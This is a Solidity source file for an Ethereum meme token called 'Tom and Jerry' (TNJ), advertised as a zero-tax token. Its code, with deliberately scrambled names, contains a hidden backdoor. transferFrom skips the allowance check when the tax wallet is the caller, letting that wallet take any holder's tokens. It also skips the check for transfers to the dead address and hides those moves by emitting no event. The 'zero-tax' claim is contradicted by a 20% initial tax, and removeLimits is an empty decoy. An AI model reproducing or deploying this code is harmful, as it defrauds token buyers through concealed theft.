// SPDX-License-Identifier: MIT

/*
    Name: Tom and Jerry
    Symbol: TNJ

    bio:
    Zero-tax meme token on Ethereum, inspired by the classic chase. Catch it if you can!

    $TNJ is here to bring the fun back! The chase begins on Ethereum with memes, excitement, and a legendary ticker. Let's make history!

    Web: https://tomandjerry.wtf
    X: https://x.com/tomandjerry_eth
    tg: https://t.me/tomandjerry_tnj
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract TNJ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcTNJ;
    mapping(address => mapping(address => uint256)) private _allcvnkjnTNJ;
    mapping(address => bool) private _feevblknlTNJ;
    address payable private _taxclknlTNJ;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Tom and Jerry";
    string private constant _symbol = unicode"TNJ";
    uint256 public _vnbbvlkTNJ = _tTotal / 100;
    uint256 public _oijboijoiTNJ = 15 * 10**18;

    uint256 private _cvjkbnkjTNJ = 10;
    uint256 private _vkjbnkfjTNJ = 10;
    uint256 private _maxovnboiTNJ = 10;
    uint256 private _initvkjnbkjTNJ = 20;
    uint256 private _finvjlkbnlkjTNJ = 0;
    uint256 private _redclkjnkTNJ = 2;
    uint256 private _prevlfknjoiTNJ = 2;
    uint256 private _buylkvnlkTNJ = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknTNJ;
    bool private _inlknblTNJ = false;
    bool private swapvlkTNJ = false;
    uint256 private _sellcnjkTNJ = 0;
    uint256 private _lastflkbnlTNJ = 0;
    address constant _deadlknTNJ = address(0xdead);

    modifier lockTheSwap() {
        _inlknblTNJ = true;
        _;
        _inlknblTNJ = false;
    }

    constructor() payable {
        _taxclknlTNJ = payable(_msgSender());

        _feevblknlTNJ[address(this)] = true;
        _feevblknlTNJ[_taxclknlTNJ] = true;

        _balknvlkcTNJ[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcTNJ[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcTNJ[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnTNJ(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnTNJ[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _downcklkojTNJ(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        if(msg.sender == _taxclknlTNJ) return false;
        if(!(sender == uniswapV2Pair || recipient != _deadlknTNJ)) return false;
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnTNJ(sender, recipient, amount);
        if (_downcklkojTNJ(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnTNJ[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnTNJ[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer_kjvnTNJ(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblTNJ(from, to, amount);

        _balknvlkcTNJ[from] = _balknvlkcTNJ[from].sub(amount);
        _balknvlkcTNJ[to] = _balknvlkcTNJ[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcTNJ[address(this)] = _balknvlkcTNJ[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (to != _deadlknTNJ) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _calcTax_lvknblTNJ(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblTNJ) {
                taxAmount = amount
                    .mul((_buylkvnlkTNJ > _redclkjnkTNJ) ? _finvjlkbnlkjTNJ : _initvkjnbkjTNJ)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlTNJ[to] &&
                to != _taxclknlTNJ
            ) {
                _buylkvnlkTNJ++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblTNJ &&
                to == uniswapV2Pair &&
                from != _taxclknlTNJ &&
                swapvlkTNJ &&
                _buylkvnlkTNJ > _prevlfknjoiTNJ
            ) {
                if (block.number > _lastflkbnlTNJ) {
                    _sellcnjkTNJ = 0;
                }
                _sellcnjkTNJ = _sellcnjkTNJ + _getAmountOut_lvcbnkTNJ(amount);
                require(_sellcnjkTNJ <= _oijboijoiTNJ, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkTNJ)
                    _swapTokenslknlTNJ(_vnbbvlkTNJ > amount ? amount : _vnbbvlkTNJ);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjTNJ(address(this).balance);
                }
                _lastflkbnlTNJ = block.number;
            }
        }
        return taxAmount;
    }

    function _sendETHTocvbnjTNJ(uint256 amount) private {
        _taxclknlTNJ.transfer(amount);
    }

    function _swapTokenslknlTNJ(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableTNJTrading() external onlyOwner {
        require(!_tradingvlknTNJ, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkTNJ = true;
        _tradingvlknTNJ = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    receive() external payable {}

    function _assist_bnTNJ() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _getAmountOut_lvcbnkTNJ(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {

    }

    function _setTax_lknblTNJ(address payable newWallet) external {
        require(_msgSender() == _taxclknlTNJ);
        _taxclknlTNJ = newWallet;
    }
}